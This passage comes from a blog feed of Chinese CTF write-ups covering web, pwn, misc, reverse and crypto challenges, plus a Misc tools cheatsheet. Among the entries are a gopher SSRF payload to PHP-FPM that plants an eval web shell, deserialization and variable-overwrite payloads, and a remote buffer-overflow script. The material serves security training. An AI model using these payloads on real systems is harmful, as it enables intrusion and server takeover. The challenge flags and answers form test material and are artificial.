'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F7%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH108%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00l%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%20%22/var/www/html/1.php%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n\n}\n$a=new dao();\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>F12添加cookie，访问<code>index.php</code>，再访问<code>1.php</code>，得到shell，之后获取flag</p>\n<h1 id=\"web-310\"><a href=\"#web-310\" class=\"headerlink\" title=\"web 310\"></a>web 310</h1><p>9000和6379都是关着的。那我们可以试试读下配置文件</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'file:///etc/nginx/nginx.conf';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n\n}\n$a=new dao();\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>得到关键信息(抓包获取)</p>\n<pre><code class=\"raw\">    server {\n        listen       4476;\n        server_name  localhost;\n        root         /var/flag;\n        index index.html;\n\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    }\n</code></pre>\n<p>poc</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'http://127.0.0.1:4476';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n}\n$a=new dao();\necho urlcode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>得到flag</p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/79d29fb/",
            "url": "http://dpm12345.cn/posts/79d29fb/",
            "title": "菜狗杯",
            "date_published": "2022-11-25T15:10:32.000Z",
            "content_html": "<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"杂项签到\"><a href=\"#杂项签到\" class=\"headerlink\" title=\"杂项签到\"></a>杂项签到</h2><p>得到1张图片。010 打开，直接搜索<code>ctfshow</code>得到flag</p>\n<p><code>ctfshow{a62b0b55682d81f7f652b26147c49040}</code></p>\n<h2 id=\"损坏的压缩包\"><a href=\"#损坏的压缩包\" class=\"headerlink\" title=\"损坏的压缩包\"></a>损坏的压缩包</h2><p>压缩包损坏，010 打开，发现为PNG头。修改后缀为png，正常打开，发现flag</p>\n<p><code>ctfshow{e19efe2eb86f10ccd7ca362110903cO5}</code></p>\n<h1 id=\"谜之栅栏\"><a href=\"#谜之栅栏\" class=\"headerlink\" title=\"谜之栅栏\"></a>谜之栅栏</h1><p>解压后得到两个图片，名称为找不同</p>\n<p>在010中打开，利用工具项的比较文件功能，可以看到两个不同点</p>\n<p><code>cfhwfaab2cb4af5a5820}</code>和<code>tso{06071f997b5bdd1a</code></p>\n<p>在根据题目说的迷之栅栏，应该为栅栏密码，而且看着很像为2个密码</p>\n<p>解密得<code>ctfshow{f0a6a0b721cfb949a7fb55ab5d8d210a}</code></p>\n<h1 id=\"你会数数吗？\"><a href=\"#你会数数吗？\" class=\"headerlink\" title=\"你会数数吗？\"></a>你会数数吗？</h1><p>使用010editor的 工具→直方图 统计计数解得flag，或者复制出来词频统计</p>\n<p>按照频次降序排，得到</p>\n<p><code>ctfshow{a1b2d3e4g56i7j8k9l0}</code></p>\n<h1 id=\"你会异或吗？\"><a href=\"#你会异或吗？\" class=\"headerlink\" title=\"你会异或吗？\"></a>你会异或吗？</h1><p>010异或0x50</p>\n<p><code>ctfshow{030dOf5073ab4681d30866d1fdf10ab1}</code></p>\n<h1 id=\"flag一分为二\"><a href=\"#flag一分为二\" class=\"headerlink\" title=\"flag一分为二\"></a>flag一分为二</h1><p>解压后得到一张图片</p>\n<p>部分一：盲水印提取(目前没有找到工具，需要理解一下原理)</p>\n<p><code>ctfshow{FirstP@RT</code></p>\n<p>部分二：修改图片高</p>\n<p><code>SecondP@rTMikumiku~}</code></p>\n<p><code>ctfshow{FirstP@RTSecondP@rTMikumiku~}</code></p>\n<h1 id=\"我是谁？？\"><a href=\"#我是谁？？\" class=\"headerlink\" title=\"我是谁？？\"></a>我是谁？？</h1><p>可以手动找，但有点多</p>\n<p>脚本</p>\n<pre><code class=\"python\">import requests\nfrom lxml import html\nimport cv2\nimport numpy as np\nimport json\n\n\nurl=\"http://xxxxxxxxxxxxxxxxxxxx.challenge.ctf.show\"\n\nsess=requests.session()\n\nall_girl=sess.get(url+'/static/all_girl.png').content\n\nwith open('all_girl.png','wb')as f:\n        f.write(all_girl)\n\nbig_pic=cv2.imdecode(np.fromfile('all_girl.png', dtype=np.uint8), cv2.IMREAD_UNCHANGED)\nbig_pic=big_pic[50:,50:,:]\nimage_alpha = big_pic[:, :, 3]\nmask_img=np.zeros((big_pic.shape[0],big_pic.shape[1]), np.uint8)\nmask_img[np.where(image_alpha == 0)] = 255\n\ncv2.imwrite('big.png',mask_img)\n\n\n\ndef answer_one(sess):\n        #获取视频文件\n        response=sess.get(url+'/check')\n        if 'ctfshow{' in response.text:\n                print(response.text)\n                exit(0)\n        tree=html.fromstring(response.text)\n        element=tree.xpath('//source[@id=\"vsource\"]')\n        video_path=element[0].get('src')\n        video_bin=sess.get(url+video_path).content\n        with open('Question.mp4','wb')as f:\n                f.write(video_bin)\n        #获取有效帧\n        video = cv2.VideoCapture('Question.mp4')\n        frame=0\n        while frame&lt;=55:\n                res, image = video.read()\n                frame+=1\n        #cv2.imwrite('temp.png',image)\n        video.release()\n        #获取剪影\n        image=image[100:400,250:500]\n        gray_image=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)\n        #cv2.imwrite('gray_image.png',gray_image)\n        temp = np.zeros((300, 250), np.uint8)\n        temp[np.where(gray_image&gt;=128)]=255\n        #去白边\n        temp = temp[[not np.all(temp[i] == 255) for i in range(temp.shape[0])], :]\n        temp = temp[:, [not np.all(temp[:, i] == 255) for i in range(temp.shape[1])]]\n        #缩放至合适大小，肉眼大致判断是1.2倍，不一定准\n        temp = cv2.resize(temp,None,fx=1.2,fy=1.2)\n        #查找位置\n        res =cv2.matchTemplate( mask_img,temp,cv2.TM_CCOEFF_NORMED)\n        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)\n        x,y=int(max_loc[0]/192),int(max_loc[1]/288)#为什么是192和288，因为大图去掉标题栏就是1920*2880\n        guess='ABCDEFGHIJ'[y]+'0123456789'[x]\n        print(f'guess:{guess}')\n        #传答案\n        response=sess.get(url+'/submit?guess='+guess)\n        r=json.loads(response.text)\n        if r['result']:\n                print('guess right!')\n                return True\n        else:\n                print('guess wrong!')\n                return False\n\ni=1\n\nwhile i&lt;=31:\n        print(f'Round:{i}')\n        if answer_one(sess):\n                i+=1\n        else:\n                i=1\n</code></pre>\n<p><code>ctfshow{f25746ff-1bea-4afb-a0b7-2ed04bc5e4ff}</code></p>\n<h1 id=\"You-and-me\"><a href=\"#You-and-me\" class=\"headerlink\" title=\"You and me\"></a>You and me</h1><p>盲水印，使用工具 BlindWaterMark-master</p>\n<pre><code class=\"bash\">python3 bwmforpy3.py decode you.png you_and_me.png wm2.png\n</code></pre>\n<p><img data-src=\"/../../../post_images/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/misc/you_and_me.png\" alt=\"you_and_me\"></p>\n<p><code>ctfshow{CDEASEFFR8846}</code></p>\n<h1 id=\"7-1-05\"><a href=\"#7-1-05\" class=\"headerlink\" title=\"7.1.05\"></a>7.1.05</h1><p>游戏工具题，比较麻烦，暂时不做</p>\n<h1 id=\"黑丝白丝还有什么丝？\"><a href=\"#黑丝白丝还有什么丝？\" class=\"headerlink\" title=\"黑丝白丝还有什么丝？\"></a>黑丝白丝还有什么丝？</h1><p>白丝为 <code>.</code> 黑丝为 <code>-</code> 转场为 <code> </code></p>\n<p>看视频手敲：<code>.-- ....- -. - - ----- -... ...-- -- --- .-. . -.-. ..- - .</code></p>\n<p>解码得<code>W4NTT0B3MORECUTE</code></p>\n<p><code>ctfshow{W4NTT0B3MORECUTE}</code></p>\n<h1 id=\"我吐了你随意\"><a href=\"#我吐了你随意\" class=\"headerlink\" title=\"我吐了你随意\"></a>我吐了你随意</h1><p>0宽隐写</p>\n<p>直接网站解<span class=\"exturl\" data-url=\"aHR0cDovLzMzMGsuZ2l0aHViLmlvL21pc2NfdG9vbHMvdW5pY29kZV9zdGVnYW5vZ3JhcGh5Lmh0bWw=\">http://330k.github.io/misc_tools/unicode_steganography.html</span></p>\n<p>得<code>ctfshow{OP_is_for_Over_Power}</code></p>\n<h1 id=\"这是个什么文件\"><a href=\"#这是个什么文件\" class=\"headerlink\" title=\"这是个什么文件\"></a>这是个什么文件</h1><p>第一步是压缩包伪加密，把0900改为0000</p>\n<p>解压得到一个文件，010打开</p>\n<p>发现为python相关文件，猜测为<code>pyc</code>文件，需要反编译</p>\n<p>uncompyle6反编译</p>\n<pre><code class=\"bash\">uncompyle6 -o 1.py 2.pyc\n</code></pre>\n<p>得到</p>\n<pre><code class=\"python\"># uncompyle6 version 3.8.0\n# Python bytecode 3.7.0 (3394)\n# Decompiled from: Python 3.10.4 | packaged by conda-forge | (main, Mar 30 2022, 08:38:02) [MSC v.1916 64 bit (AMD64)]\n# Embedded file name: 2.py\n# Compiled at: 2022-10-23 13:57:28\n# Size of source mod 2**32: 148 bytes\nflag = bytes([99, 116, 102, 115, 104, 111, 119, 123, 99, 100, 106, 110, 106, 100, 95, 53, 54, 53, 102, 95, 71, 67, 68, 72, 95, 107, 99, 114, 105, 109, 125]).decode()\nprint(flag)\n</code></pre>\n<p>运行后得到<code>ctfshow{cdjnjd_565f_GCDH_kcrim}</code></p>\n<h1 id=\"抽象画\"><a href=\"#抽象画\" class=\"headerlink\" title=\"抽象画\"></a>抽象画</h1><p>得到一个txt文件，像是base编码</p>\n<p>basecrack使用，得到</p>\n<pre><code>89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 00 00 00 49 00 00 00 12 08 03 00 00 00 20 e4 03 da 00 00 00 3f 50 4c 54 45 ff ff ff ff c0 c0 ff ff c0 c0 ff c0 c0 ff ff c0 c0 ff ff c0 ff ff 00 00 ff ff 00 00 ff 00 00 ff ff 00 00 ff ff 00 ff c0 00 00 c0 c0 00 00 c0 00 00 c0 c0 00 00 c0 c0 00 c0 ff ff ff 00 00 00 cc 44 ef f2 00 00 01 91 49 44 41 54 38 8d ad 94 d9 6e 03 21 0c 45 cd 32 6c 83 87 45 f9 ff 6f ad c1 06 d2 aa 95 fa 90 a3 3c 20 f0 d8 d7 17 13 f0 a8 4a 31 4c b4 17 73 3b d5 09 e7 72 ee 8c c3 87 d1 a5 46 a2 98 d6 56 70 2b 0e 36 ba a1 f7 1e 3c f4 9c 6b b2 93 3b 95 c8 84 71 38 00 5a c0 13 82 d6 fa 6d f3 b2 f1 64 ba 99 96 e5 14 43 d4 93 40 2a 64 65 b8 80 4d 97 6b 17 22 2a 08 61 09 0d b9 48 a6 e8 34 6d a0 93 5e 58 d8 6f a2 58 d0 f8 da e8 29 51 b6 71 35 d8 e1 9b 98 f0 24 da 40 46 3d 85 31 b5 a5 6a 87 7d 93 ac 96 da a7 9b d3 9d b6 b5 4e 83 8e 10 48 91 14 4c 86 94 9e 9d f3 b9 89 0f 3b ca 14 85 5a e5 9d e9 4f 0d 44 9d d8 c4 54 f0 da 9c 0e c0 d3 cf e5 84 2b 53 52 86 3e 8d 34 09 47 88 07 72 62 97 a6 f3 18 6b d1 e2 f1 0f 4b ad 5d 99 30 fe e9 cb 16 73 67 a6 fb a0 06 14 af 94 ac 9a 5e 89 12 99 b0 ab b0 a1 63 a9 dc 2d e3 67 a3 4c ef 90 c6 ab 37 1b 29 4e 32 d9 f6 e3 f2 c6 ed 89 41 95 0e f7 9c fb 29 e4 84 32 c5 a8 24 99 5c 19 77 42 a5 f3 5d a5 19 20 9f b6 2b 34 44 73 7e 96 ec 66 a5 4a 4a 8f 0c fc 1a 4c f0 48 a9 b7 3d cc d5 71 bc bb f1 fa 96 41 cc 13 93 89 f4 de 24 ec 8e fd bc 96 70 29 f2 7a 4d 2c 95 a2 db e0 aa c7 21 ed c5 60 f4 8a 04 9f b9 6f f5 0c 26 d0 83 83 b7 82 f4 b7 f0 76 7f e0 5f f0 29 3e 95 ea e5 3f 26 ea f5 9f 44 5f ed ce 23 44 59 16 0b e7 00 00 00 00 49 45 4e 44 ae 42 60 82\n</code></pre>\n<p>89504e开头，png图片</p>\n<p>将其复制到010，生成图片文件</p>\n<p>打开，只有色彩，使用nipet</p>\n<pre><code class=\"base\">nipet 抽象画.png\n</code></pre>\n<p>得到<code>ctfshow{dec8de_frejnv_frejer89}</code></p>\n<h1 id=\"迅疾响应\"><a href=\"#迅疾响应\" class=\"headerlink\" title=\"迅疾响应\"></a>迅疾响应</h1><p>正常二维码扫不出来，用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZXJyaWN4LmdpdGh1Yi5pby9xcmF6eWJveC8=\">Qrazybox</span>扫</p>\n<p>把纠错区给涂白了，再让Qrazybox扫一次。</p>\n<p><img data-src=\"/../../../post_images/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/misc/%E8%BF%85%E7%96%BE%E5%93%8D%E5%BA%94.png\" alt=\"迅疾响应\"></p>\n<p><code>ctfshow{11451419-1981-landexiangle}</code></p>\n<h1 id=\"我可没有骗你\"><a href=\"#我可没有骗你\" class=\"headerlink\" title=\"我可没有骗你\"></a>我可没有骗你</h1><p>直接上ARCHPR掩码攻击,得到密码55813329</p>\n<p>然后得到一个音频文件，虽然是mp3后缀，拖进010editor查看，其实这玩意是个wav格式的文件，改后缀</p>\n<p>然后用Silent eye，Sound qualit选择high</p>\n<p>然后就得到flag啦</p>\n<p>ctfshow{aha_cdsc_jejcfe5rj_cjfr24J}</p>\n<h1 id=\"你被骗了\"><a href=\"#你被骗了\" class=\"headerlink\" title=\"你被骗了\"></a>你被骗了</h1><p>属性的副标题里有个flag，这个是假flag</p>\n<p>用MP3Stego</p>\n<p>Decode.exe -X -P nibeipianle nibeipianle.mp3</p>\n<p>得到flag</p>\n<p><code>ctfshow{chdv_1dcs_cjksnjn_NJDSjdcdjn}</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/a9a9d995/",
            "url": "http://dpm12345.cn/posts/a9a9d995/",
            "title": "c1game2022",
            "date_published": "2022-11-15T12:10:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"流离\"><a href=\"#流离\" class=\"headerlink\" title=\"流离\"></a>流离</h2><p>访问flag.php </p>\n<p>302重定向 </p>\n<p>bp抓包，得到<code>YzFnYW1lezY5MmY4ZTJhLThkYjEtNGVhNy1hYWQzLTQyZGNkNWY1MjQ4ZH0=</code></p>\n<p>base64 解码</p>\n<h2 id=\"小机灵鬼\"><a href=\"#小机灵鬼\" class=\"headerlink\" title=\"小机灵鬼\"></a>小机灵鬼</h2><p>根据直接关闭命令行窗口，可知会有备份文件</p>\n<p>主页面为index.html</p>\n<p>那么尝试vim的备份文件<code>.index.html.swp</code></p>\n<p>下载后，打开，得到flag</p>\n<h2 id=\"神奇的-PHP\"><a href=\"#神奇的-PHP\" class=\"headerlink\" title=\"神奇的 PHP\"></a>神奇的 PHP</h2><pre><code class=\"php\">&lt;?php\n\nheader(\"Content-Type:text/html;charset=UTF-8\");\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nif(isset($_POST['c1sec_c1game.com']) and isset($_POST['c1game_c1sec.com']) and isset($_GET['what'])){\n    $a=$_POST['c1sec_c1game.com'];\n    $b=$_POST['c1game_c1sec.com'];\n    $c=$_GET['what'];\n    $access=preg_match('/^[a-z]+$/',$a) and preg_match('/^[0-9]+$/',$b) and is_numeric($c);\n    if($access){\n        $flag=$$b;\n        $$a=$flag;\n        $sentence='PHP是世界上'.base64_decode($c).'！！！';\n\n        if($sentence==='PHP是世界上最好的语言！！！'){\n            echo $if;\n        }\n        else{\n            die('PHP是世界上_____！！！');\n        }\n        \n    }\n    else{\n        die('正则好像不对呢~');\n    }\n}\nelse{\n    die('参数好像不对呢~');\n}\n</code></pre>\n<p><code>[</code>用于使后面的。生效，<code>%2B</code>防止<code>+</code>被解析为空格</p>\n<p>and优先级较低，只需满足<code>c1sec_c1game.com</code></p>\n<p>然后变量覆盖</p>\n<pre><code class=\"raw\">?what=5pyA5aW955qE6K%2Bt6KiA\nc1sec[c1game.com=if&amp;c1game[c1sec.com=flag\n</code></pre>\n<h2 id=\"unserialize\"><a href=\"#unserialize\" class=\"headerlink\" title=\"unserialize\"></a>unserialize</h2><pre><code class=\"php\">&lt;?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\nclass student{\n    public $name='6';\n    public $age='6';\n    public $id='6';\n    public $password='6';\n    public $user='customer';\n    function __construct($name,$age,$id,$password){\n        if(isset($name)){\n            $this-&gt;name=$name;\n        }\n\n        if(is_numeric($age) &amp;&amp; 0&lt;$age &amp;&amp; $age&lt;100){\n            $this-&gt;age=$age;\n        }\n\n        if(preg_match('/^[0-9]+$/',$id)){\n            $this-&gt;id=$id;\n        }\n\n        if(isset($password)){\n            $this-&gt;password=$password;\n        }\n    }\n\n    function getflag(){\n        if($this-&gt;user==='admin'){\n            include('flag.php');\n            echo $flag;\n        }\n    }\n}\n\n$name=$_POST['name'];\n$age=$_POST['age'];\n$id=$_POST['id'];\n$password=$_POST['password'];\n\n$you=new student($name,$age,$id,$password);\n$txt=serialize($you);\n$txt=str_replace('system','',$txt);\n$you=unserialize($txt);\n$you-&gt;getflag();\n</code></pre>\n<pre><code class=\"raw\">name=12systemsystemsystemsystemsystemsystemsystemsystemsystemsystem&amp;age=12&amp;id=1&amp;password=2\";s:3:\"age\";s:1:\"1\";s:2:\"id\";s:1:\"1\";s:8:\"password\";s:1:\"1\";s:4:\"user\";s:5:\"admin\";}\n</code></pre>\n<p>字符串逃逸</p>\n<h2 id=\"GetStart\"><a href=\"#GetStart\" class=\"headerlink\" title=\"GetStart\"></a>GetStart</h2><p>源代码</p>\n<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>锁定ip 210.45.240.105 </p>\n<p>http协议 </p>\n<p>找到有account的，找到密码</p>\n<h2 id=\"zip\"><a href=\"#zip\" class=\"headerlink\" title=\"zip\"></a>zip</h2><p>13位<code>86170</code>开头的密码，爆破得到<code>8617091633416</code></p>\n<p>解压后得到一个zip，再解压得到一个jpg 文件，查看十六进制，可以发现一个flag.php</p>\n<p>尝试修改后缀zip，发现还可以解压，得到flag.zip和hint.txt</p>\n<p>明文爆破bkcrack，得到<code>eaf1a992 09190ee1 4db595dc</code></p>\n<p>根据密钥重设密码到新的压缩文件，最后解压</p>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"PWN1\"><a href=\"#PWN1\" class=\"headerlink\" title=\"PWN1\"></a>PWN1</h2><p>exploit中由系统命令<code>/bin/sh</code>，地址为<code>0x08048710</code></p>\n<p>buf为 <code>0x28</code> ,32位程序</p>\n<pre><code class=\"python\">from pwn import  *  #调用 pwntools 库\n\nr = remote('110.42.135.23',8001)     #远程连接\n\noffset = 0x28 + 4    #偏移量\npayload = offset * b'a' + p64(0x08048556)  #漏洞利用\n\nr.sendline(payload)\t\t#发送漏洞\nr.interactive()\t\t#远程交互\n</code></pre>\n<h1 id=\"Re\"><a href=\"#Re\" class=\"headerlink\" title=\"Re\"></a>Re</h1><h2 id=\"消失的眼角膜\"><a href=\"#消失的眼角膜\" class=\"headerlink\" title=\"消失的眼角膜\"></a>消失的眼角膜</h2><p>x64dbg, 匹配特征<code>c1game{</code></p>\n<pre><code class=\"raw\">00353013  00 01 00 00 00 63 31 67 61 6D 65 7B 65 66 63 34   .....c1game{efc4  \n00353023  34 39 61 38 2D 64 36 65 37 2D 34 30 36 36 2D 61   49a8-d6e7-4066-a  \n00353033  38 66 64 2D 61 39 31 39 63 34 31 66 30 32 39 65   8fd-a919c41f029e  \n00353043  7D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   }...............\n</code></pre>\n<p><code>c1game{efc449a8-d6e7-4066-a8fd-a919c41f029e}</code></p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"sign-in\"><a href=\"#sign-in\" class=\"headerlink\" title=\"sign_in\"></a>sign_in</h2><p>base64+9位栅栏密码解密</p>\n<h2 id=\"simpleRSA\"><a href=\"#simpleRSA\" class=\"headerlink\" title=\"simpleRSA\"></a>simpleRSA</h2><pre><code class=\"python\">import gmpy2\nfrom Crypto.Util.number import getPrime,bytes_to_long,long_to_bytes\n\nn = 17059805890675154693689194288904267774695041123738004404461252355931749537256504106864757370530965094729301403177401232511697113169942047001632614748389778776949621403260132175713091579361699262690831128217506233471711088592360371415138359668668902484818547836547385172564154148434043225056672605026800339316667423300334434526097239282972716203333557787747794962788217402529840470723591447060910066674822885210027210326580256141148160665377384900535203791437241675901316582327789429177275242061073379317946306640966687061512350099831125270165431703880990624613908733069252296878934985408774059475092794512523080766539\nc = 11487335554594570987021649475033996895861564502690662533200904623601988366773443336447195985826100834897217629944003139575883637681757821764679587747075478721044189404774136037249229029289459493710718033086673062439885296483907973711438958249716545665478578954099770503221029293550688088768556291784706960084896505127785940095685156578631332394317211562782074512852427386796334826076646684317528163232691492952297031098534809070414710870459808593180155305180793487260745715684974146081936090993106941063978778822577086229724295007368109984163058792509211715433604285376229658279191540448618558457800014329092772909395\nn2 = 23012025370124001858525530093853244957679434339999937669273578422036039777773855520527043636469110937261167897590863547343322869643427039895150702808618550480113432975006416294458998153505113099153413892621239847164414531541565097716473755858423009252325247675550948653264684015712734795130932382623523765724588528898199002870851712103580147129954703380838312377896784086624933840225005006184120873346016441146985436133288195435319457419337841503406510742809073371046673340494486471363163152444298463705665684085830436750957541325210655377533803555584150491152224387025692535808304922514530476984367481961431087774359\nc2 = 17872510308468366750900256064351765382493212220388548052984754919429931114181409890152991736964952508824650784152795476748394389714643309182515750486551374017198119956515955701677543818813141696650480202802311271558301034523345129601508301061345759434656762226708537164690678445063032525080969245429169552858269926114916433320994771998685054356161887875321287410590032015722118512059386073935587280370447517416614147539732538314848984227505768894216048331935555154412118389527669413006913800783220301852193481559957930857585407219177112307272103171971681857543598200390102671514748647235215428360604828388159067909154\ne = 0x10001\ngift = 501758996784563373343799832026596111020442385992294247190036833997992633448720709025434040309734267492038276564041212720932268034410060205930371022011464081674988864801768593403326222922402919490906797888750183337403267311540010923974657637313791249553486701074923093310710416130413036031078606030200009979894095222367729360826207044341434010233246808477013068881281940927763223238271572240888627730132340468007065521646923181402721705541823057449503355673566805765162918486297905617953784011249027996072019478705700456104256865868809914072963953455286872676573961212447731668302016003620263171125847145221780086384\n\ndef decode1(c,n,gift):\n    d = gmpy2.invert(0x10001,gift)\n    res1 = pow(c,d,n)\n    ans = long_to_bytes(res1).decode('utf-8')\n    return ans\ndef decode2(c,n,gift):\n    d = gmpy2.invert(0x10001,gift)\n    first = pow(c,d,n)\n    num = first //2022\n    p = gmpy2.gcd(first,n)\n    m = num // p\n    ans = long_to_bytes(m).decode('utf-8')\n    return ans\np = gmpy2.gcd(c2,n2)\nq = n2 // p\ns = \"c1game{\" + decode1(c,n,gift) + decode2(c2,n2,(p-1)*(q-1)) + \"}\"\nprint(s)\n</code></pre>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/df95b584/",
            "url": "http://dpm12345.cn/posts/df95b584/",
            "title": "Misc",
            "date_published": "2022-11-15T12:10:32.000Z",
            "content_html": "<h1 id=\"文件操作\"><a href=\"#文件操作\" class=\"headerlink\" title=\"文件操作\"></a>文件操作</h1><h2 id=\"文件类型判断\"><a href=\"#文件类型判断\" class=\"headerlink\" title=\"文件类型判断\"></a>文件类型判断</h2><p>Linux下的file命令</p>\n<p>十六进制查看文件头</p>\n<pre><code class=\"raw\">JPEG (jpg)：FF D8 FF E1\nPNG (png)：89 50 4E 47\nGIF (gif)：47 49 46 38\nTIFF (tif)：49 49 2A 00\nWindows Bitmap (bmp)：42 4D C0 01\nCAD (dwg)：41 43 31 30\nAdobe Photoshop (psd)：38 42 50 53\nRich Text Format (rtf)：7B 5C 72 74 66\nXML (xml)：3C 3F 78 6D 6C\nHTML (html)：68 74 6D 6C3 E\nEmail [thorough only] (eml)：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A\nOutlook Express (dbx)：CF AD 12 FE C5 FD 74 6F\nOutlook (pst)：21 42 44 4E\nMS Word/Excel (xls.or.doc)：D0 CF 11 E0\nMS Access (mdb)：53 74 61 6E 64 61 72 64 20 4A\nWordPerfect (wpd)：FF 57 50 43\nAdobe Acrobat (pdf)：25 50 44 46 2D 31 2E\nQuicken (qdf)：AC 9E BD 8F\nWindows Password (pwl)：E3 82 85 96\nZIP Archive (zip)：50 4B 03 04\nRAR Archive (rar)：52 61 72 21\nWave (wav)：57 41 56 45\nAVI (avi)：41 56 49 20\nReal Audio (ram)：2E 72 61 FD\nReal Media (rm)：2E 52 4D 46\nMPEG (mpg)：00 00 01 BA\nMPEG (mpg)：00 00 01 B3\nQuicktime (mov)：6D 6F 6F 76\nWindows Media (asf)：30 26 B2 75 8E 66 CF 11\nMIDI (mid)：4D 54 68 64\n</code></pre>\n<h2 id=\"文件分离\"><a href=\"#文件分离\" class=\"headerlink\" title=\"文件分离\"></a>文件分离</h2><ul>\n<li><p>Binwalk工具</p>\n<pre><code class=\"raw\">binwalk filename  分析文件\n\nbinwalk -e filename  分离文件\n</code></pre>\n</li>\n<li><p>foremost</p>\n<pre><code class=\"raw\">foremost filename -o output_floder\n</code></pre>\n</li>\n<li><p>dd手动分离</p>\n<pre><code class=\"raw\">dd if = 源文件 of = 目标文件名 bs=1 skip = 开始分离的字节数\n\nif=file  #输入文件名，缺省为标准输入\nof=file  #输出文件名，缺省为标准输出\nbs=bytes  #同时设置读写块的大小为 bytes，可代替 ibs 和 obs\nskip=blocks  #从输入文件开头跳过 block 个块后再开始复制\n</code></pre>\n<p>例如: <code>dd if=1.txt of=2.txt bs=5 count=1</code></p>\n<p>其中，<code>1.txt</code>为源文件，<code>2.txt</code>为输出文件，<code>bs</code>为设置的块的大小，<code>count</code>为读几个这样的块，如果是上面的，那么就读写<code>1.txt</code>的<code>1</code>个<code>5</code>字节的块，并输出到<code>2.txt</code>中</p>\n</li>\n<li><p>010 Editor手动分离</p>\n<p>选择需要保存的部分，右键 -&gt; Selection-&gt;Save Selection</p>\n</li>\n</ul>\n<h2 id=\"文件合并\"><a href=\"#文件合并\" class=\"headerlink\" title=\"文件合并\"></a>文件合并</h2><h3 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h3><p>合并</p>\n<pre><code class=\"bash\">cat file1 file2 file3 ... &gt; new_file\n</code></pre>\n<p>完整性检测</p>\n<pre><code class=\"bash\">md5sum new_file\n</code></pre>\n<h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3><pre><code class=\"bash\">copy /B file1+file2+file3+... new_file\n</code></pre>\n<h1 id=\"文件隐写\"><a href=\"#文件隐写\" class=\"headerlink\" title=\"文件隐写\"></a>文件隐写</h1><ul>\n<li><p>notepad++/010Editor 打开后搜索相关内容</p>\n</li>\n<li><p>图片隐写</p>\n<ul>\n<li><p>细微的颜色差别</p>\n</li>\n<li><p>GIF 图多帧隐藏</p>\n<ul>\n<li>颜色通道隐藏</li>\n<li>不同帧图信息隐藏</li>\n<li>不同帧对比隐写</li>\n</ul>\n</li>\n<li><p>Exif 信息隐藏 (windows 右键属性，Linux 使用 exiftool )</p>\n</li>\n<li><p>图片修复</p>\n<ul>\n<li>图片头修复</li>\n<li>图片尾修复</li>\n<li>CRC 校验修复</li>\n<li>长、宽、高度修复</li>\n</ul>\n</li>\n<li><p>最低有效位 LSB 隐写</p>\n</li>\n<li><p>图片加密</p>\n<ul>\n<li>Stegdetect</li>\n<li>outguess</li>\n<li>Jphide</li>\n<li>F5</li>\n</ul>\n</li>\n<li><p>使用工具</p>\n<ul>\n<li>firework</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"LSB-隐写的工具\"><a href=\"#LSB-隐写的工具\" class=\"headerlink\" title=\"LSB 隐写的工具\"></a>LSB 隐写的工具</h2><h3 id=\"Stegsolve\"><a href=\"#Stegsolve\" class=\"headerlink\" title=\"Stegsolve\"></a>Stegsolve</h3><h3 id=\"zsteg-能自动列举出所有情况的最低有效位\"><a 